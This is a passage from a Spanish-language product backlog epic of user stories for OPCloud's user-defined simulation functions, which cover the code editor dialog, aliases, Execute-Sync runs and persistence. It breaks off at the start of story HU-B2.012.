---
epica: "EPICA-B2"
titulo: "Simulacion — funciones definidas por usuario (codigo-como-computacion en procesos)"
doc_fuente: "opcloud-reverse/b2-simulation-user-functions.md"
estado: "revision-piloto"
last_check: 2026-04-28
prioridad_predominante: "S"
hu_emitidas: 26
fuente_normativa: "/home/felix/kora/artifacts/knowledge/fxsl/opm/opm-ssot-es"
evidencia_opcloud: "/home/felix/projects/deep-opm-pro/"
metodologia_revision: "DIAGNOSTICO-PILOTO-EPICA-10.md"
---

## Resumen

Esta epica cubre la **capa computacional definida por usuario** de la simulacion: el mecanismo por el cual un proceso OPM se convierte en **funcion evaluable** mediante un cuerpo de codigo (JavaScript / subset llamado "TypeScript" por OPCloud) que referencia atributos de sus instrumentos via alias. Es la pieza que convierte a OPM en un lenguaje bimodal no solo conceptual sino tambien **ejecutable**: el modelador deja de describir y empieza a computar sin salir del diagrama.

El alcance se centra en el **ciclo completo de autoria** de una funcion definida por usuario: entrada al modo (radio `User Defined` dentro de Computation), editor de codigo (dialogo modeless `Function:` con textarea, boton `Update`, asa de arrastre), contrato entre **alias de cosa** (`{p1}`, `{p2}`) y **variables accesibles** en el cuerpo (`p1.x`, `p2.y`), marca visual `` en el nombre del proceso tras el binding, ejecucion sincrona que lee/escribe casillas embebidas, y la gobernanza minima (errores, persistencia, re-edicion). La epica NO cubre el mecanismo de creacion de atributos via estereotipo `<<Point>>` (pertenece a EPICA-A0), ni la simulacion probabilistica (EPICA-B1), ni range-validation (EPICA-B3), ni conditions/loops (EPICA-B4), ni user input (EPICA-B5).

Ademas de las HU de producto (editor, binding, ejecucion, persistencia), se incluyen HU **aspiracionales** que el corpus OPCloud sugiere pero no confirma en Advance 4: biblioteca organizacional de funciones reutilizables, testing dry-run, versionado, scoping, sandboxing, control de tiempo de ejecucion y pack de ejemplos. Todas estas HU se marcan con la clase de afirmacion correspondiente (`observado` vs `hipotesis` vs `abierto`) y llevan etiqueta `requires-clarification` cuando descansan sobre preguntas del §11 del doc fuente.

## Tabla de HU de la epica

| ID | Titulo | Actor | Prioridad | Tamano | Tipo | SSOT |
|---|---|---|---|---|---|---|
| HU-B2.001 | Activar modo User Defined en Computation de un proceso | IS | S | S | opcloud-ui | — |
| HU-B2.002 | Abrir dialogo modeless Function al activar User Defined | IS | S | S | opcloud-ui | — |
| HU-B2.003 | Ver placeholder por defecto `return a+b;` en textarea | IS | S | XS | opcloud-ui | — |
| HU-B2.004 | Editar cuerpo de funcion con texto libre en textarea | IS | S | S | opcloud-ui | — |
| HU-B2.005 | Confirmar cuerpo de funcion con boton Update | IS | S | XS | opcloud-ui | — |
| HU-B2.006 | Marcar proceso con sufijo `` tras asociar funcion | IS | S | XS | opcloud-ui | — |
| HU-B2.007 | Arrastrar dialogo Function con asa para liberar canvas | IS | C | XS | opcloud-ui | — |
| HU-B2.008 | Asignar alias a cosa con boton Edit Alias | IS | S | S | mixto | [OPL-ES D3..D4] |
| HU-B2.009 | Referenciar atributos via alias de cosa y alias de atributo | IS | S | M | mixto | [V-1] |
| HU-B2.010 | Leer partes de agregacion a traves del alias del todo | IS | S | M | opm-semantica | [V-239] [V-240] |
| HU-B2.011 | Ejecutar funcion con Execute → Sync y poblar casillas | IS | S | M | opcloud-ui | — |
| HU-B2.012 | Persistir cuerpo de funcion en el modelo entre sesiones | IS | S | S | opcloud-ui | — |
| HU-B2.013 | Reabrir dialogo Function con cuerpo previo precargado | IS | S | S | opcloud-ui | — |
| HU-B2.014 | Regresar de User Defined a funcion predefinida | IS | C | S | opcloud-ui | — |
| HU-B2.015 | Reportar error de sintaxis en cuerpo de funcion | IS | S | M | opcloud-ui | — |
| HU-B2.016 | Reportar error de runtime (alias indefinido, div/0) | IS | S | M | opcloud-ui | — |
| HU-B2.017 | Cancelar edicion del dialogo Function sin persistir | IS | C | XS | opcloud-ui | — |
| HU-B2.018 | Probar funcion con dry-run sin modificar casillas reales | IS | S | M | opcloud-ui | — |
| HU-B2.019 | Ejecutar paso a paso con debug de valores de alias | IS | C | M | opcloud-ui | — |
| HU-B2.020 | Organizar funciones reutilizables en biblioteca organizacional | AO | C | L | opcloud-ui | — |
| HU-B2.021 | Importar funcion desde biblioteca organizacional a un proceso | IS | C | M | opcloud-ui | — |
| HU-B2.022 | Exportar funcion del proceso a biblioteca organizacional | AO | C | S | opcloud-ui | — |
| HU-B2.023 | Versionar cuerpo de funcion con historial minimo | IS | C | M | opcloud-ui | — |
| HU-B2.024 | Limitar tiempo de ejecucion con timeout configurable | AO | S | S | opcloud-ui | — |
| HU-B2.025 | Sandboxar ejecucion sin acceso a red ni a DOM | AO | M1 | L | opcloud-ui | — |
| HU-B2.026 | Cargar pack de ejemplos de funciones canonicas OPM | PD | C | S | opcloud-ui | — |

Total: **26 historias de usuario** (3 mixto, 1 opm-semantica, 22 opcloud-ui).

Nota de clasificacion: la capa de simulacion con codigo definido por usuario es una extension de OPCloud no normada por la SSOT OPM (ISO 19450). Las HU marcadas `opm-semantica` o `mixto` tocan estructuras OPM subyacentes (agregacion, alias como puente nombre↔codigo).

## Historias de usuario

### HU-B2.001 — Activar modo User Defined en Computation de un proceso

**Actor primario:** IS (ingeniero de simulacion).
**Actores secundarios:** ME (experto).
**Tipo:** opcloud-ui.
**Nivel categorico:** U primario; K (marca proceso como computacional definido por usuario) secundario.
**Superficie UI:** secundaria/halo del proceso + submenu Computation.
**Gesto canonico:** clic en radio/entry `User Defined` dentro del submenu Computation.

**Historia:**
> Como ingeniero de simulacion, quiero seleccionar `User Defined` en el menu de Computation de un proceso para indicar que voy a parametrizarlo con codigo propio en lugar de una funcion predefinida.

**Contexto de negocio:**
La capa definida por usuario es la extension natural de las funciones predefinidas (`adding`, `subtract`). Separar la eleccion de modo del editor de codigo evita que el novato abra por accidente un textarea cuando solo queria un calculo trivial. El radio hace explicito el commit a escribir codigo.

**Criterios de aceptacion:**
- **Dado** que tengo un proceso seleccionado, **cuando** despliego el submenu `Computation`, **entonces** veo entre las opciones `User Defined` como radio/entry paralela a las funciones predefinidas.
- **Dado** que selecciono `User Defined`, **cuando** hago clic, **entonces** el proceso adopta el modo `computation = user_defined` y se dispara la apertura del dialogo Function (ver HU-B2.002).
- **Dado** que el proceso ya tenia funcion predefinida, **cuando** cambio a `User Defined`, **entonces** el cuerpo anterior no aplica y el editor arranca con el default `return a+b;` (salvo que hubiera un cuerpo definido por usuario previo — ver HU-B2.013).

**Reglas y restricciones:**
- El modo `user_defined` es un valor del enum `computation` del proceso; co-existe con `none`, `predefined:<name>`, `user_defined`.
- La opcion debe estar visible tanto desde halo/pie menu como desde toolbar contextual (paridad de afordances).

**Modelo de datos tocado:**
- `process.computation.mode` — `"none" | "predefined" | "user_defined"` — persistente.
- `process.computation.predefinedName` — string opcional — persistente.

**Dependencias:**
- Bloqueada por: HU-10.001 (existe proceso).
- Bloquea a: HU-B2.002, HU-B2.006.

**Integraciones:**
- Halo/pie menu (EPICA-10).
- Toolbar contextual del proceso.

**Notas de evidencia:**
- Fuente: §1.1, §2 tabla superficies, §3.1 paso 10.
- Frames: frame_00032 (dialogo abierto implica modo activado previamente).
- Transcripcion: "we have the user defined here … paralelo a adding y subtract".
- Clase de afirmacion: confirmado por transcripcion.

**Prioridad:** S.
**Tamano:** S.
**Etiquetas:** [simulation-user-function, ui, secundaria, computation].

---

### HU-B2.002 — Abrir dialogo modeless Function al activar User Defined

**Actor primario:** IS.
**Tipo:** opcloud-ui.
**Nivel categorico:** U.
**Superficie UI:** dialogo-modeless-function sobre canvas.
**Gesto canonico:** ninguno (apertura automatica post-activacion del modo).

**Historia:**
> Como ingeniero de simulacion, quiero que al activar `User Defined` se abra automaticamente el editor de codigo para entrar directo al flujo de autoria sin un clic extra.

**Contexto de negocio:**
La continuidad gestual (activar modo → editar codigo) reduce la friccion cognitiva. El dialogo se abre **modeless** (no bloqueante) para que el usuario pueda inspeccionar el canvas, leer nombres de alias en los objetos-atributo y volver al codigo sin cerrar el editor.

**Criterios de aceptacion:**
- **Dado** que active `User Defined` en un proceso, **cuando** se aplica el cambio de modo, **entonces** aparece el dialogo `Function:` anclado a un costado de la elipse (derecho por default).
- **Dado** que el dialogo esta abierto, **cuando** hago clic en el canvas fuera del dialogo, **entonces** el canvas sigue respondiendo a clics y drags (modeless — no captura foco exclusivo).
- **Dado** que el dialogo esta abierto, **cuando** muevo la elipse del proceso, **entonces** el dialogo se reancla o se mantiene en posicion previa (a definir — ver HU-B2.007).

**Reglas y restricciones:**
- Dialogo tiene: titulo `Function:`, textarea, boton `Update`, asa de arrastre (icono cruz 4-flechas) en esquina superior derecha.
- Comportamiento modeless es invariante: nunca bloquea el canvas.

**Modelo de datos tocado:**
- `ui.functionDialog.isOpen` — boolean — transitorio.
- `ui.functionDialog.anchorProcessId` — string — transitorio.

**Dependencias:**
- Bloqueada por: HU-B2.001.
- Bloquea a: HU-B2.003, HU-B2.004, HU-B2.005.

**Integraciones:**
- Canvas (coordenadas).
- Proceso seleccionado (anchor).

**Notas de evidencia:**
- Fuente: §2 tabla, §3.1 paso 10.
- Frames: frame_00032.
- Clase de afirmacion: observado.

**Prioridad:** S.
**Tamano:** S.
**Etiquetas:** [simulation-user-function, ui, modeless-dialog, editor].

---

### HU-B2.003 — Ver placeholder por defecto `return a+b;` en textarea

**Actor primario:** IS.
**Actores secundarios:** MN.
**Tipo:** opcloud-ui.
**Nivel categorico:** U.
**Superficie UI:** dialogo-modeless-function / textarea.
**Gesto canonico:** ninguno (render inicial).

**Historia:**
> Como ingeniero de simulacion, quiero ver un placeholder ejecutable (`return a+b;`) al abrir por primera vez el editor para tener un andamiaje que me oriente sobre el shape esperado del cuerpo.

**Contexto de negocio:**
El default no es un comentario ni un texto guia: es codigo real que funciona con los parametros `a`, `b` inyectados por el runtime. Esto ensena implicitamente la convencion (el cuerpo es un `return` que usa variables disponibles) y permite al novato ejecutar inmediatamente para ver el pipeline completo antes de personalizar.

**Criterios de aceptacion:**
- **Dado** que abro el dialogo Function por primera vez en un proceso sin funcion previa, **cuando** miro el textarea, **entonces** contiene exactamente `return a+b;`.
- **Dado** que confirmo sin editar, **cuando** ejecuto, **entonces** el proceso intenta sumar los dos primeros parametros disponibles (a, b).
- **Dado** que elimino el default y dejo el textarea vacio, **cuando** intento `Update`, **entonces** se bloquea el guardado o se alerta (pregunta abierta sobre comportamiento exacto de cuerpo vacio — ver HU-B2.015).

**Reglas y restricciones:**
- El default es la string literal `return a+b;` incluyendo el punto y coma.
- El placeholder solo aparece si el proceso nunca tuvo cuerpo definido por usuario; si tuvo uno, precarga el previo (ver HU-B2.013).

**Modelo de datos tocado:**
- `process.computation.body` — string — persistente (inicialmente `"return a+b;"`).

**Dependencias:**
- Bloqueada por: HU-B2.002.

**Integraciones:**
- Editor de texto.

**Notas de evidencia:**
- Fuente: §1.1, §2 tabla, §3.1 paso 10.
- Frames: frame_00032.
- Transcripcion: "the return a plus b is just the default".
- Clase de afirmacion: confirmado por transcripcion.

**Prioridad:** S.
**Tamano:** XS.
**Etiquetas:** [simulation-user-function, ui, default, placeholder].

---

### HU-B2.004 — Editar cuerpo de funcion con texto libre en textarea

**Actor primario:** IS.
**Tipo:** opcloud-ui.
**Nivel categorico:** U.
**Superficie UI:** textarea del dialogo Function.
**Gesto canonico:** escritura libre con teclado.

**Historia:**
> Como ingeniero de simulacion, quiero escribir el cuerpo de mi funcion con libertad en un textarea multilinea para expresar calculos arbitrariamente complejos sin las limitaciones de una funcion predefinida.

**Contexto de negocio:**
El editor de la version Advance 4 es un textarea plano: sin coloreado de sintaxis, sin autocompletado, sin numeros de linea. Es el minimo viable de editor. La simpleza es deliberada — el dialogo es modeless y liviano. Versiones posteriores (Advance 7) evolucionan a IDE integrado; en este corte del corpus se documenta el minimum-viable.

**Criterios de aceptacion:**
- **Dado** que el textarea esta enfocado, **cuando** escribo codigo multilinea, **entonces** se aceptan saltos de linea, espacios, tabuladores sin restricciones.
- **Dado** que escribo `return (p2.y-p1.y)/(p2.x-p1.x);`, **cuando** termino, **entonces** el textarea muestra exactamente esa cadena (sin auto-format, sin colorizacion).
- **Dado** que el textarea ya tiene el default, **cuando** selecciono-todo + tecleo, **entonces** el nuevo texto reemplaza el default.
- **Dado** que excedo el alto visible, **cuando** escribo mas lineas, **entonces** aparece scroll interno sin romper el dialogo.

**Reglas y restricciones:**
- El subset aceptado se llama "TypeScript" en la UI pero en la practica es JavaScript plano con `return` al final.
- No hay resaltado de sintaxis en esta version.
- No hay autocompletado ni insercion de snippets.

**Modelo de datos tocado:**
- `ui.functionDialog.draft` — string — transitorio (hasta `Update`).

**Dependencias:**
- Bloqueada por: HU-B2.003.
- Bloquea a: HU-B2.005.

**Integraciones:**
- Ninguna externa (editor local al dialogo).

**Notas de evidencia:**
- Fuente: §1.1, §2 tabla, §3.1 pasos 11–12, §5.1.
- Frames: frame_00036, frame_00038.
- Transcripcion: "here it's a function written in typescript that we can change as we want".
- Clase de afirmacion: observado + confirmado.

**Prioridad:** S.
**Tamano:** S.
**Etiquetas:** [simulation-user-function, ui, editor, textarea].

---

### HU-B2.005 — Confirmar cuerpo de funcion con boton Update

**Actor primario:** IS.
**Tipo:** opcloud-ui.
**Nivel categorico:** U primario; K (persiste body) secundario.
**Superficie UI:** boton `Update` del dialogo Function.
**Gesto canonico:** clic en `Update`.

**Historia:**
> Como ingeniero de simulacion, quiero confirmar el cuerpo de mi funcion con un solo clic en `Update` para persistirlo en el proceso y cerrar el editor.

**Contexto de negocio:**
El binding cuerpo↔proceso ocurre en el commit explicito. Hasta `Update` el cuerpo es un borrador; no hay autoguardado. Esto permite al usuario experimentar sin comprometerse. El cierre del dialogo al confirmar es intencional: libera canvas y senaliza el fin del ciclo de autoria.

**Criterios de aceptacion:**
- **Dado** que edite el cuerpo, **cuando** hago clic en `Update`, **entonces** el cuerpo se persiste en `process.computation.body`, el dialogo se cierra y el nombre del proceso recibe el sufijo `` (ver HU-B2.006).
- **Dado** que `Update` esta presionado, **cuando** se persiste, **entonces** el panel OPL-ES no emite oracion nueva (la funcion NO se verbaliza — ver §7 observacion arquitectonica).
- **Dado** que no hay cambios respecto del cuerpo previo, **cuando** hago clic en `Update`, **entonces** el dialogo se cierra igual sin efecto persistido adicional.

**Reglas y restricciones:**
- `Update` es el unico commit path observado; cancelar con `x` se trata en HU-B2.017.
- La persistencia es sincrona desde la perspectiva del usuario: no hay spinner.

**Modelo de datos tocado:**
- `process.computation.body` — string — persistente (escrita desde `ui.functionDialog.draft`).

**Dependencias:**
- Bloqueada por: HU-B2.004.
- Bloquea a: HU-B2.006, HU-B2.011, HU-B2.012.

**Integraciones:**
- Nombre del proceso (sufijo).
- Modelo persistente.

**Notas de evidencia:**
- Fuente: §2 tabla, §3.1 paso 12, §5.1.
- Frames: frame_00038 → frame_00042 (transicion post-Update).
- Clase de afirmacion: observado.

**Prioridad:** S.
**Tamano:** XS.
**Etiquetas:** [simulation-user-function, ui, persistencia, commit].

---

### HU-B2.006 — Marcar proceso con sufijo `` tras asociar funcion

**Actor primario:** IS.
**Actores secundarios:** RV (lector).
**Tipo:** opcloud-ui.
**Nivel categorico:** V.
**Superficie UI:** canvas — nombre del proceso.
**Gesto canonico:** ninguno (render reactivo a `process.computation.mode ≠ none`).

**Historia:**
> Como ingeniero de simulacion, quiero que el proceso muestre un sufijo `` en su nombre al tener una funcion asociada para identificar visualmente que procesos son computables.

**Contexto de negocio:**
El sufijo `` es la **unica marca visual** del estado computacional de un proceso. Sin ella, un proceso con funcion definida por usuario luce identico a uno descriptivo. Esta marca es la concesion minima al principio OPM de "todo lo semanticamente relevante debe ser visualmente explicito" — el cuerpo del codigo permanece oculto, pero su existencia esta senalada.

**Criterios de aceptacion:**
- **Dado** que un proceso tiene `computation.mode ∈ {predefined, user_defined}`, **cuando** se renderiza, **entonces** su nombre aparece con sufijo `` pegado sin espacio.
- **Dado** que un proceso no tiene funcion (`mode = none`), **cuando** se renderiza, **entonces** el nombre NO tiene `` — se muestra crudo.
- **Dado** que el proceso se llama `Point Slope Calculating` y se le asocia funcion, **cuando** se renderiza, **entonces** muestra `Point Slope Calculating `.

**Reglas y restricciones:**
- El sufijo es decorativo en el render — NO forma parte del `process.name` persistente.
- El color y peso del sufijo heredan del estilo del nombre.
- No hay contenido dentro de los parentesis en esta version; es abierto si podrian llegar a mostrar firma formal (ver §11 preguntas abiertas).

**Modelo de datos tocado:**
- Ninguno directo; es derivacion de `process.computation.mode`.

**Dependencias:**
- Bloqueada por: HU-B2.005 (o HU-B1.xxx para predefinida).

**Integraciones:**
- Renderer JointJS (label del shape).

**Notas de evidencia:**
- Fuente: §2 tabla, §3.1 paso 12, §9.
- Frames: frame_00042, frame_00044, frame_00046, frame_00047.
- Transcripcion: "the braces and the tooltip that now the calculating has become a computational process".
- Clase de afirmacion: confirmado por transcripcion.

**Prioridad:** S.
**Tamano:** XS.
**Etiquetas:** [simulation-user-function, render, marca-visual, sufijo].

---

### HU-B2.007 — Arrastrar dialogo Function con asa para liberar canvas

**Actor primario:** ME.
**Tipo:** opcloud-ui.
**Nivel categorico:** U.
**Superficie UI:** asa del dialogo (icono cruz 4-flechas).
**Gesto canonico:** mouse-down en asa + drag.

**Historia:**
> Como modelador experto, quiero arrastrar el dialogo Function por su asa para reposicionarlo sobre el canvas y ver simultaneamente el codigo y los objetos-atributo que referencia.

**Contexto de negocio:**
El cuerpo suele usar alias de objetos-atributo (`p1.x`, `p2.y`) que estan visibles en el canvas. Si el dialogo cubre esos nombres, el modelador tiene que alternar ciegamente. El drag manual resuelve la colision visual sin cerrar el editor.

**Criterios de aceptacion:**
- **Dado** que el dialogo esta abierto, **cuando** hago mouse-down en la asa (esquina superior derecha con icono cruz 4-flechas), **entonces** se inicia drag.
- **Dado** que inicie drag del dialogo, **cuando** muevo el mouse, **entonces** el dialogo sigue al cursor.
- **Dado** que suelto el mouse, **cuando** termino el drag, **entonces** el dialogo queda anclado a la nueva posicion.
- **Dado** que el dialogo se desplazo, **cuando** cambio la seleccion a otro proceso, **entonces** se cierra y reabre anclado al nuevo proceso (reset de posicion — hipotesis).

**Reglas y restricciones:**
- La asa es el unico area de drag; el resto del dialogo se deja interactuar normalmente.
- El drag no cambia la semantica — el dialogo sigue ligado al proceso seleccionado.

**Modelo de datos tocado:**
- `ui.functionDialog.position` — `{x, y}` — transitorio.

**Dependencias:**
- Bloqueada por: HU-B2.002.

**Integraciones:**
- Ninguna.

**Notas de evidencia:**
- Fuente: §2 tabla, §5.1.
- Frames: observado icono en frame_00032.
- Clase de afirmacion: observado.

**Prioridad:** C.
**Tamano:** XS.
**Etiquetas:** [simulation-user-function, ui, modeless-dialog, drag].

---

### HU-B2.008 — Asignar alias a cosa con boton Edit Alias

**Actor primario:** IS.
**Actores secundarios:** AD (autor de dominio).
**Tipo:** mixto.
**Nivel categorico:** K (anade atributo `alias` a Thing).
**Superficie UI:** toolbar contextual — icono con tooltip literal `Edit Alias`.
**Gesto canonico:** clic en icono Edit Alias + escritura en dialogo.

**Historia:**
> Como ingeniero de simulacion, quiero asignar un alias corto (`p1`, `p2`, `m`) a una cosa para poder referenciarla dentro del codigo de una funcion definida por usuario, incluso si su nombre contiene espacios.

**Contexto de negocio:**
OPCloud **obliga** a mediar por alias para referenciar cosas con nombres multi-palabra desde codigo, porque `Point 1.x` es ambiguo lexicamente (el espacio rompe el parser). El alias es el puente entre el lenguaje natural del modelo y el lenguaje de programacion del cuerpo. La capacidad aplica tambien a objetos no-computacionales (transcripcion explicita). El alias como atributo de cosa no esta en la SSOT OPM canonica — es una convencion OPCloud que extiende el nucleo OPM con un puente sintactico hacia el runtime de simulacion. La verbalizacion en OPL-ES del alias es parte del contrato bimodal [OPL-ES D3..D4].

**Criterios de aceptacion:**
- **Dado** que tengo una cosa seleccionada, **cuando** hago clic en el icono `Edit Alias` de la toolbar contextual, **entonces** se abre un dialogo de edicion del alias.
- **Dado** que el dialogo esta abierto, **cuando** escribo `p1` y confirmo, **entonces** la cosa gana el atributo `alias = "p1"` y se renderiza con `{p1}` en una segunda linea dentro de su shape.
- **Dado** que una cosa no tiene alias asignado, **cuando** la miro, **entonces** no se muestra el par de llaves `{}`.
- **Dado** que asigne alias `p1` a `Point 1`, **cuando** consulto el panel OPL-ES, **entonces** aparece la verbalizacion `<Nombre>, <alias>, ...` (p.ej. `<<Point>> Point 1, p1, consists of ...`).
- **Dado** que intento asignar alias duplicado a dos cosas, **cuando** confirmo el segundo, **entonces** el sistema advierte o rechaza (pregunta abierta sobre politica exacta).

**Reglas y restricciones:**
- El alias es atributo **textual** de la cosa (Object o Process).
- Sintaxis observada: minusculas + digitos (`p1`, `p2`, `x`, `y`, `m`). Si se permiten espacios es **pregunta abierta** (§11).
- Render: el alias aparece entre llaves `{alias}` debajo del nombre en el shape.
- Un alias invalido para JS (ej. palabra reservada, empieza con numero) deberia rechazarse en runtime (abierto).

**Modelo de datos tocado:**
- `thing.alias` — string nullable — persistente.

**Dependencias:**
- Bloqueada por: HU-10.001 o HU-10.002 (cosa debe existir).
- Bloquea a: HU-B2.009, HU-B2.010.

**Integraciones:**
- Panel OPL-ES (verbaliza alias).
- Biblioteca `Draggable OPM Things` (lista `Nombre {alias}`).
- Canvas renderer (segunda linea del shape).

**Notas de evidencia:**
- Fuente: §1.1, §2 tabla, §3.1 paso 9, §9.
- Frames: frame_00028.
- Transcripcion: "alias is used in specific calculation when the object name is more than just one word so you can call it within functions", "even if the object is not computational this is what the alias button is for".
- Clase de afirmacion: confirmado por transcripcion.

**Prioridad:** S.
**Tamano:** S.
**Etiquetas:** [simulation-user-function, kernel, alias, rename].

---

### HU-B2.009 — Referenciar atributos via alias de cosa y alias de atributo

**Actor primario:** IS.
**Tipo:** mixto.
**Nivel categorico:** K primario (contrato runtime↔modelo); U secundario.
**Superficie UI:** textarea del dialogo Function.
**Gesto canonico:** ninguno (regla de resolucion en runtime).

**Historia:**
> Como ingeniero de simulacion, quiero referenciar en mi funcion `p1.x`, `p2.y` (alias de cosa + punto + alias de atributo) para que el runtime resuelva al valor de la casilla embebida correspondiente.

**Contexto de negocio:**
Este es el **contrato formal** entre el texto del codigo y el grafo del modelo: `{alias_cosa}.{alias_atributo}` resuelve al `value` de la casilla embebida del atributo. Es el puente categorico entre la sintaxis JS y el kernel OPM. Sin el, el codigo es opaco al modelo. Aunque la capa de ejecucion de codigo no esta en la SSOT OPM, la estructura de cosa-con-atributos que se referencia si lo esta [V-1].

**Criterios de aceptacion:**
- **Dado** que `Point 1` tiene alias `p1` y agrega `X of Point 1` con alias `x`, **cuando** el cuerpo contiene `p1.x`, **entonces** en runtime se resuelve al valor de la casilla de `X of Point 1`.
- **Dado** que la casilla contiene `1`, **cuando** se ejecuta, **entonces** `p1.x` vale `1` (numero).
- **Dado** que el cuerpo usa `return (p2.y - p1.y) / (p2.x - p1.x);` con p1=(1,7) y p2=(5,19), **cuando** se ejecuta, **entonces** el retorno es `3`.
- **Dado** que un alias de atributo se referencia sin alias de cosa (`x` suelto), **cuando** se ejecuta, **entonces** es **abierto** (no hay evidencia de binding global — probablemente error).
- **Dado** que el retorno es un numero, **cuando** se ejecuta, **entonces** se escribe en la casilla de la cosa resultado (conectada por enlace de Result).

**Reglas y restricciones:**
- Resolucion: `alias_cosa.alias_atributo` → `thing_with_alias.parts.find(alias==atributo).value`.
- El retorno de la funcion se vuelca en el/los atributo(s) resultado del proceso.
- Si un alias no existe, el comportamiento es runtime error (HU-B2.016).

**Modelo de datos tocado:**
- Ninguno nuevo; consume `thing.alias`, `thing.parts[].alias`, `thing.parts[].value`.

**Dependencias:**
- Bloqueada por: HU-B2.008 (alias), HU-B2.005 (body).
- Bloquea a: HU-B2.011 (ejecucion usa contrato).

**Integraciones:**
- Runtime de evaluacion (kernel).
- Validador (HU-B2.015, HU-B2.016).

**Notas de evidencia:**
- Fuente: §1, §1.1, §3.1, §6 modelo de datos.
- Frames: frame_00038 cuerpo, frame_00046 resultado.
- Transcripcion: "we have point one and point two and their parts we can use the parts as defined in opm".
- Clase de afirmacion: confirmado por transcripcion.

**Prioridad:** S.
**Tamano:** M.
**Etiquetas:** [simulation-user-function, kernel, alias, contrato, runtime].

---

### HU-B2.010 — Leer partes de agregacion a traves del alias del todo

**Actor primario:** IS.
**Tipo:** opm-semantica.
**Nivel categorico:** K.
**Superficie UI:** contrato implicito del runtime.
**Gesto canonico:** ninguno.

**Historia:**
> Como ingeniero de simulacion, quiero que mi funcion pueda leer `p1.x` aunque el enlace instrumento al proceso sea solo a `Point 1` (el todo) para aprovechar la descomposicion OPM declarada por agregacion sin tener que cablear manualmente cada parte.

**Contexto de negocio:**
OPM declara la agregacion (todo-partes) como relacion semantica primera [V-239] [V-240]. El runtime definido por usuario respeta esa estructura: basta un enlace al todo para acceder a sus partes. Esto preserva la elegancia OPM (el modelador no duplica informacion) y mantiene el codigo corto. A diferencia de otras HU de esta epica, la navegacion de agregacion en runtime deriva directamente de la semantica estructural OPM: el enlace estructural (agregacion) ya existe en el modelo; el runtime solo lo aprovecha.

**Criterios de aceptacion:**
- **Dado** que `Point 1` agrega `X of Point 1` y `Y of Point 1`, **cuando** conecto `Point 1` al proceso con enlace instrumento (y **no** conecto directamente las partes), **entonces** en runtime `p1.x` y `p1.y` son accesibles.
- **Dado** que una parte no esta declarada por agregacion, **cuando** el cuerpo la referencia, **entonces** el runtime no la resuelve (error — ver HU-B2.016).
- **Dado** que la agregacion se modifica (se agrega una tercera parte `Z`), **cuando** ejecuto, **entonces** `p1.z` tambien es accesible sin cambiar el cableado.

**Reglas y restricciones:**
- El runtime navega la relacion `whole.parts[].alias` a partir del alias del todo.
- Solo se navega una profundidad inicial (parts del todo directo); anidamiento profundo es **pregunta abierta**.

**Modelo de datos tocado:**
- Ninguno nuevo; explota `aggregation_link` existente.

**Dependencias:**
- Bloqueada por: HU-B2.009, HU-10.x (aggregation link).

**Integraciones:**
- Kernel de modelo (traversal de agregacion).
- EPICA-A0 (estereotipos que introducen agregaciones por plantilla).

**Notas de evidencia:**
- Fuente normativa: [V-239] familias canonicas de enlace (incluye estructurales); [V-240] firma de enlaces.
- Fuente: §1.1, §3.1 paso 6.
- Transcripcion: "the process needs to have its instrument defined but once we define a specific instrument we can use it as and it's part as part of the computational process using the aliases".
- Clase de afirmacion: confirmado por transcripcion + confirmado por SSOT (agregacion).

**Prioridad:** S.
**Tamano:** M.
**Etiquetas:** [simulation-user-function, kernel, agregacion, alias, traversal].

---

### HU-B2.011 — Ejecutar funcion con Execute → Sync y poblar casillas

**Actor primario:** IS.
**Tipo:** opcloud-ui.
**Nivel categorico:** X (integracion runtime); V (efecto visual en casillas).
**Superficie UI:** boton Execute + submenu Sync + casillas embebidas.
**Gesto canonico:** clic en Execute → clic en Sync.

**Historia:**
> Como ingeniero de simulacion, quiero ejecutar la funcion con `Execute → Sync` y ver los resultados poblar en tiempo real las casillas de los objetos-atributo resultado para validar el calculo con ojos.

**Contexto de negocio:**
Sync es el modo de ejecucion canonico — un disparo, un calculo, valores visibles. La actualizacion en vivo de las casillas convierte al canvas en dashboard. El flujo de ejecucion es identico al de funciones predefinidas (Advance 3), lo que mantiene la coherencia: definida por usuario no introduce nueva UI de ejecucion.

**Criterios de aceptacion:**
- **Dado** que el proceso tiene funcion definida por usuario valida y sus instrumentos tienen valores en casillas, **cuando** hago clic en `Execute → Sync`, **entonces** la funcion se evalua y el retorno se escribe en la casilla de la cosa resultado.
- **Dado** que con `p1=(1,7)`, `p2=(5,19)` y cuerpo `return (p2.y-p1.y)/(p2.x-p1.x);`, **cuando** ejecuto sync, **entonces** `Slope.m = 3` queda escrito en la casilla embebida de Slope.
- **Dado** que una casilla de entrada esta vacia (`value` placeholder), **cuando** ejecuto, **entonces** la funcion recibe `undefined` o `null` (abierto) — ver HU-B2.016 para reporte de error.
- **Dado** que la ejecucion termino, **cuando** reviso el panel OPL-ES, **entonces** aparece la entrada `<Nombre>, <alias>, is <valor>.` para el atributo computado.

**Reglas y restricciones:**
- Sync es sincrono desde la perspectiva del usuario (sin timeout observable en Advance 4; ver HU-B2.024 para limite).
- La ejecucion dispara la barra de simulacion runtime completa (play, stop, dado, XLSX, iter, reload, play-∆, tabla, slider, headless).

**Modelo de datos tocado:**
- `thing.parts[].value` — number | null — persistente tras ejecucion (segun politica — abierto si persiste o es transitorio).

**Dependencias:**
- Bloqueada por: HU-B2.005, HU-B2.009.
- Bloquea a: HU-B2.018 (dry-run).

**Integraciones:**
- Motor de ejecucion (EPICA-B0/B1).
- Barra de simulacion runtime.
- Panel OPL-ES.

**Notas de evidencia:**
- Fuente: §1.1, §3.1 paso 14, §5.2.
- Frames: frame_00042, frame_00044, frame_00046.
- Transcripcion: "if we want to perform and execute this calculation we'll again click on the execute and do the sync execute".
- Clase de afirmacion: confirmado por transcripcion.

**Prioridad:** S.
**Tamano:** M.
**Etiquetas:** [simulation-user-function, ejecucion, sync, runtime].

---

### HU-B2.012 — Persistir cuerpo de funcion en el modelo entre sesiones

**Actor primario:** IS.
**Tipo:** opcloud-ui.
**Nivel categorico:** P (persistencia).
**Superficie UI:** persistencia transparente.
**Gesto canonico:** ninguno (ocurre al Save del modelo).

**Historia:**
> Como ingeniero de simulacion, quiero que el cuerpo de mi funcion se persista con el modelo para recuperarlo intacto en la proxima sesion sin tener que reescribirlo.

**Contexto de negocio:**
El cuerpo es la carga semantica mas importante del modelo computable (§7 observacion arquitectonica). Perderlo entre sesiones seria catastrofico. La persistencia junto al proceso respeta la localidad — el cuerpo viaja con el proceso, no en un archivo separado.

**Criterios de aceptacion:**
